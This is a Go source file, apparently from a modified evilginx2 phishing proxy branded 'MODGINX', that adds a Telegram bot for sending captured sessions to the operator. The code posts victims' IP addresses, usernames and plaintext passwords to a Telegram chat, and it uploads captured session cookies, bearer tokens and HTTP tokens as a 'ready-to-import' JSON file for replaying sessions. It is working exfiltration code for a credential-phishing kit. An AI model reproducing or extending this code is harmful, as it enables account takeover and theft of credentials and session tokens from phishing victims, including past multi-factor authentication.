package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	BotToken string
	ChatId   string
}

type TelegramMessage struct {
	ChatId    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

type TelegramEditMessage struct {
	ChatId    string `json:"chat_id"`
	MessageId int    `json:"message_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

type TelegramResponse struct {
	Ok     bool                   `json:"ok"`
	Result TelegramMessageResult `json:"result"`
}

type TelegramMessageResult struct {
	MessageId int `json:"message_id"`
}

type TelegramDocument struct {
	ChatId    string `json:"chat_id"`
	Caption   string `json:"caption"`
	ParseMode string `json:"parse_mode"`
}

type TelegramDocumentResponse struct {
	Ok     bool                       `json:"ok"`
	Result TelegramDocumentResult     `json:"result"`
}

type TelegramDocumentResult struct {
	MessageId int                    `json:"message_id"`
	Document  TelegramDocumentInfo   `json:"document"`
}

type TelegramDocumentInfo struct {
	FileId   string `json:"file_id"`
	FileName string `json:"file_name"`
}

// Ready-to-import format - contains only tokens, no session info or credentials
type TokensExport struct {
	SessionID     string                          `json:"session_id"`
	Phishlet      string                          `json:"phishlet"`
	LastUpdated   string                          `json:"last_updated"`
	TokenCount    int                             `json:"token_count"`
	CookieTokens  map[string]map[string]CookieData `json:"cookies"`
	BearerTokens  map[string]string               `json:"bearer_tokens"`
	HttpTokens    map[string]string               `json:"http_tokens"`
}

// Simplified cookie data for import
type CookieData struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Path     string `json:"path,omitempty"`
	HttpOnly bool   `json:"httponly,omitempty"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{}
}

func (t *TelegramBot) Setup(botToken string, chatId string) {
	t.BotToken = botToken
	t.ChatId = chatId
}

func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int, phishletName string, cfgDir string) error {
	// Validate setup
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}

	// Check if session has meaningful data
	if !t.hasValidSessionData(session) {
		log.Debug("telegram: skipping notification for session %d - no meaningful data", sessionIndex)
		return nil
	}

	// Check if we have auth tokens
	hasAuthTokens := len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
	
	// Determine if this is initial notification or update
	if !session.TelegramNotified {
		// First time notification
		return t.sendInitialNotification(session, sessionIndex, phishletName, cfgDir, hasAuthTokens)
	} else {
		// Update existing notification
		return t.updateExistingNotification(session, sessionIndex, phishletName, cfgDir, hasAuthTokens)
	}
}

func (t *TelegramBot) sendInitialNotification(session *Session, sessionIndex int, phishletName string, cfgDir string, hasAuthTokens bool) error {
	log.Info("telegram: sending initial notification for session %d", sessionIndex)
	
	if hasAuthTokens {
		// Create and send JSON file with message
		jsonFile, err := t.createTokensExportFile(session, sessionIndex, phishletName, cfgDir)
		if err != nil {
			log.Error("telegram: failed to create tokens file: %v", err)
			// Fall back to message only
			return t.sendInitialMessage(session, sessionIndex, phishletName)
		}
		
		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
		messageId, fileId, err := t.sendDocumentWithIds(jsonFile, caption)
		if err != nil {
			log.Error("telegram: failed to send document: %v", err)
			os.Remove(jsonFile)
			return t.sendInitialMessage(session, sessionIndex, phishletName)
		}
		
		// Store IDs for future updates
		session.TelegramMessageID = messageId
		session.TelegramFileID = fileId
		session.TelegramNotified = true
		session.LastTokenUpdate = int64(len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens))
		
		os.Remove(jsonFile)
		log.Success("telegram: initial notification with JSON sent for session %d", sessionIndex)
		
	} else {
		// Send message only
		return t.sendInitialMessage(session, sessionIndex, phishletName)
	}
	
	return nil
}

func (t *TelegramBot) sendInitialMessage(session *Session, sessionIndex int, phishletName string) error {
	message := t.formatSessionMessage(session, sessionIndex, phishletName)
	messageId, err := t.sendMessageWithId(message)
	if err != nil {
		log.Error("telegram: failed to send message: %v", err)
		return err
	}
	
	session.TelegramMessageID = messageId
	session.TelegramNotified = true
	
	log.Success("telegram: initial message sent for session %d", sessionIndex)
	return nil
}

func (t *TelegramBot) updateExistingNotification(session *Session, sessionIndex int, phishletName string, cfgDir string, hasAuthTokens bool) error {
	log.Info("telegram: updating notification for session %d", sessionIndex)
	
	if hasAuthTokens && session.TelegramFileID != "" {
		// Update both message and JSON file
		err := t.updateMessageAndFile(session, sessionIndex, phishletName, cfgDir)
		if err != nil {
			log.Error("telegram: failed to update message and file: %v", err)
			return err
		}
	} else if session.TelegramMessageID > 0 {
		// Update message only
		err := t.updateMessage(session, sessionIndex, phishletName)
		if err != nil {
			log.Error("telegram: failed to update message: %v", err)
			return err
		}
	}
	
	log.Success("telegram: notification updated for session %d", sessionIndex)
	return nil
}

func (t *TelegramBot) updateMessageAndFile(session *Session, sessionIndex int, phishletName string, cfgDir string) error {
	// Create updated JSON file
	jsonFile, err := t.createTokensExportFile(session, sessionIndex, phishletName, cfgDir)
	if err != nil {
		return fmt.Errorf("failed to create updated tokens file: %v", err)
	}
	defer os.Remove(jsonFile)
	
	// Check if token count has changed significantly (new tokens added)
	currentTokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	tokenCountChanged := int64(currentTokenCount) != session.LastTokenUpdate
	
	if tokenCountChanged {
		// Send new JSON file with updated tokens
		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
		caption += fmt.Sprintf("\n\n🔄 *Updated:* %s", time.Now().Format("15:04:05"))
		
		messageId, fileId, err := t.sendDocumentWithIds(jsonFile, caption)
		if err != nil {
			log.Error("telegram: failed to send updated document: %v", err)
			// Fallback to message update only
			return t.updateMessage(session, sessionIndex, phishletName)
		}
		
		// Update session with new message info
		session.TelegramMessageID = messageId
		session.TelegramFileID = fileId
		session.LastTokenUpdate = int64(currentTokenCount)
		
		log.Success("telegram: sent updated JSON file for session %d (tokens: %d)", sessionIndex, currentTokenCount)
	} else {
		// Just update the message caption
		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
		caption += fmt.Sprintf("\n\n🔄 *Last Update:* %s", time.Now().Format("15:04:05"))
		
		err = t.editMessage(session.TelegramMessageID, caption)
		if err != nil {
			log.Warning("telegram: failed to edit message: %v", err)
			return err
		}
		
		log.Debug("telegram: updated message caption for session %d", sessionIndex)
	}
	
	return nil
}

func (t *TelegramBot) updateMessage(session *Session, sessionIndex int, phishletName string) error {
	message := t.formatSessionMessage(session, sessionIndex, phishletName)
	return t.editMessage(session.TelegramMessageID, message)
}

func (t *TelegramBot) hasValidSessionData(session *Session) bool {
	// Check if session has meaningful data - made more permissive
	hasCredentials := session.Username != "" || session.Password != ""
	hasTokens := len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
	hasCustomData := len(session.Custom) > 0
	hasBasicInfo := session.RemoteAddr != "" || session.UserAgent != ""
	
	// Allow notifications for sessions that have any meaningful data
	// This includes credentials, tokens, custom fields, or basic session info
	return hasCredentials || hasTokens || hasCustomData || hasBasicInfo
}

func (t *TelegramBot) formatSessionMessage(session *Session, sessionIndex int, phishletName string) string {
	var message strings.Builder
	
	message.WriteString("🎣 MODGINX Session Captured\n\n")
	message.WriteString(fmt.Sprintf("📊 Session ID: %d\n", sessionIndex))
	message.WriteString(fmt.Sprintf("🎯 Phishlet: %s\n", phishletName))
	message.WriteString(fmt.Sprintf("🌐 IP Address: %s\n", session.RemoteAddr))
	message.WriteString(fmt.Sprintf("🖥️ User Agent: %s\n", session.UserAgent))
	message.WriteString(fmt.Sprintf("⏰ Time: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))

	// Add credentials if available (but NOT tokens)
	if session.Username != "" {
		message.WriteString(fmt.Sprintf("👤 Username: %s\n", session.Username))
	}
	if session.Password != "" {
		message.WriteString(fmt.Sprintf("🔑 Password: %s\n", session.Password))
	}

	// Add custom fields
	if len(session.Custom) > 0 {
		message.WriteString("\n📝 Custom Fields:\n")
		for key, value := range session.Custom {
			message.WriteString(fmt.Sprintf("  • %s: %s\n", key, value))
		}
	}

	// Only mention token count, tokens will be in JSON file
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	if tokenCount > 0 {
		message.WriteString(fmt.Sprintf("\n🍪 Auth Tokens: %d captured\n", tokenCount))
		message.WriteString("📁 Tokens available in downloadable JSON file\n")
	}

	return message.String()
}



func (t *TelegramBot) sendMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.BotToken)
	
	log.Debug("telegram: sending message to chat ID: %s", t.ChatId)
	log.Debug("telegram: message length: %d characters", len(message))
	
	telegramMsg := TelegramMessage{
		ChatId:    t.ChatId,
		Text:      message,
		ParseMode: "Markdown",
	}
	
	jsonData, err := json.Marshal(telegramMsg)
	if err != nil {
		log.Error("telegram: failed to marshal message: %v", err)
		return fmt.Errorf("failed to marshal telegram message: %v", err)
	}
	
	log.Debug("telegram: making API request to: %s", url)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Error("telegram: HTTP request failed: %v", err)
		return fmt.Errorf("failed to send telegram message: %v", err)
	}
	defer resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	log.Debug("telegram: API response status: %d", resp.StatusCode)
	log.Debug("telegram: API response body: %s", string(body))
	
	if resp.StatusCode != http.StatusOK {
		log.Error("telegram: API error response: %s", string(body))
		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	log.Debug("telegram: message sent successfully")
	return nil
}

func (t *TelegramBot) Test() error {
	if t.BotToken == "" || t.ChatId == "" {
		return fmt.Errorf("telegram bot token or chat ID not configured")
	}
	
	testMessage := "🧪 MODGINX Telegram Test\n\nTelegram notifications are working correctly!"
	return t.sendMessage(testMessage)
}

func (t *TelegramBot) sendMessageWithId(message string) (int, error) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.BotToken)
	
	telegramMsg := TelegramMessage{
		ChatId:    t.ChatId,
		Text:      message,
		ParseMode: "Markdown",
	}
	
	jsonData, err := json.Marshal(telegramMsg)
	if err != nil {
		return 0, fmt.Errorf("failed to marshal telegram message: %v", err)
	}
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, fmt.Errorf("failed to send telegram message: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return 0, fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	var response TelegramResponse
	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return 0, fmt.Errorf("failed to decode telegram response: %v", err)
	}
	
	if !response.Ok {
		return 0, fmt.Errorf("telegram API returned error")
	}
	
	return response.Result.MessageId, nil
}

func (t *TelegramBot) editMessage(messageId int, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", t.BotToken)
	
	editMsg := TelegramEditMessage{
		ChatId:    t.ChatId,
		MessageId: messageId,
		Text:      text,
		ParseMode: "Markdown",
	}
	
	jsonData, err := json.Marshal(editMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal edit message: %v", err)
	}
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send edit request: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	return nil
}

func (t *TelegramBot) sendDocumentWithIds(filePath string, caption string) (int, string, error) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.BotToken)
	
	file, err := os.Open(filePath)
	if err != nil {
		return 0, "", fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()
	
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)
	
	writer.WriteField("chat_id", t.ChatId)
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")
	
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return 0, "", fmt.Errorf("failed to create form file: %v", err)
	}
	
	_, err = io.Copy(part, file)
	if err != nil {
		return 0, "", fmt.Errorf("failed to copy file: %v", err)
	}
	
	writer.Close()
	
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return 0, "", fmt.Errorf("failed to create request: %v", err)
	}
	
	req.Header.Set("Content-Type", writer.FormDataContentType())
	
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return 0, "", fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	var response TelegramDocumentResponse
	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return 0, "", fmt.Errorf("failed to decode document response: %v", err)
	}
	
	if !response.Ok {
		return 0, "", fmt.Errorf("telegram API returned error")
	}
	
	return response.Result.MessageId, response.Result.Document.FileId, nil
}

func (t *TelegramBot) createTokensExportFile(session *Session, sessionIndex int, phishletName string, cfgDir string) (string, error) {
	// Create tokens-only export data
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	
	exportData := TokensExport{
		SessionID:     session.Id,
		Phishlet:      phishletName,
		LastUpdated:   time.Now().Format("2006-01-02 15:04:05"),
		TokenCount:    tokenCount,
		CookieTokens:  make(map[string]map[string]CookieData),
		BearerTokens:  session.BodyTokens,
		HttpTokens:    session.HttpTokens,
	}
	
	// Convert cookie tokens to simplified format
	for domain, cookies := range session.CookieTokens {
		exportData.CookieTokens[domain] = make(map[string]CookieData)
		for name, cookie := range cookies {
			exportData.CookieTokens[domain][name] = CookieData{
				Name:     name,
				Value:    cookie.Value,
				Domain:   domain,
				Path:     cookie.Path,
				HttpOnly: cookie.HttpOnly,
			}
		}
	}
	
	// Convert to JSON
	jsonData, err := json.MarshalIndent(exportData, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal tokens data: %v", err)
	}
	
	// Create temp file with meaningful name
	tempDir := os.TempDir()
	filename := fmt.Sprintf("session_%d_tokens_%s.json", sessionIndex, phishletName)
	filePath := filepath.Join(tempDir, filename)
	
	err = ioutil.WriteFile(filePath, jsonData, 0600)
	if err != nil {
		return "", fmt.Errorf("failed to write tokens file: %v", err)
	}
	
	log.Debug("telegram: created tokens export file: %s", filePath)
	return filePath, nil
}



func (t *TelegramBot) formatSessionCaption(session *Session, sessionIndex int, phishletName string) string {
	var caption strings.Builder
	
	caption.WriteString("🎣 MODGINX Session Captured\n\n")
	caption.WriteString(fmt.Sprintf("📊 Session ID: %d\n", sessionIndex))
	caption.WriteString(fmt.Sprintf("🎯 Phishlet: %s\n", phishletName))
	caption.WriteString(fmt.Sprintf("🌐 IP Address: %s\n", session.RemoteAddr))
	caption.WriteString(fmt.Sprintf("⏰ Time: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	
	// Add credentials if available (but NOT tokens)
	if session.Username != "" {
		caption.WriteString(fmt.Sprintf("👤 Username: %s\n", session.Username))
	}
	if session.Password != "" {
		caption.WriteString(fmt.Sprintf("🔑 Password: %s\n", session.Password))
	}
	
	// Add token count summary - tokens are in the JSON file only
	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
	if tokenCount > 0 {
		caption.WriteString(fmt.Sprintf("\n🍪 Auth Tokens: %d captured\n", tokenCount))
		caption.WriteString("📁 All tokens available in this JSON file")
	}
	
	return caption.String()
}

func (t *TelegramBot) sendDocument(filePath string, caption string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.BotToken)
	
	// Open file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()
	
	// Create multipart form
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)
	
	// Add chat_id field
	writer.WriteField("chat_id", t.ChatId)
	
	// Add caption field
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")
	
	// Add document field
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}
	
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}
	
	writer.Close()
	
	log.Debug("telegram: sending document to chat ID: %s", t.ChatId)
	log.Debug("telegram: document path: %s", filePath)
	
	// Send request
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	
	req.Header.Set("Content-Type", writer.FormDataContentType())
	
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("telegram: HTTP request failed: %v", err)
		return fmt.Errorf("failed to send document: %v", err)
	}
	defer resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	log.Debug("telegram: API response status: %d", resp.StatusCode)
	log.Debug("telegram: API response body: %s", string(body))
	
	if resp.StatusCode != http.StatusOK {
		log.Error("telegram: API error response: %s", string(body))
		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
	}
	
	log.Debug("telegram: document sent successfully")
	return nil
}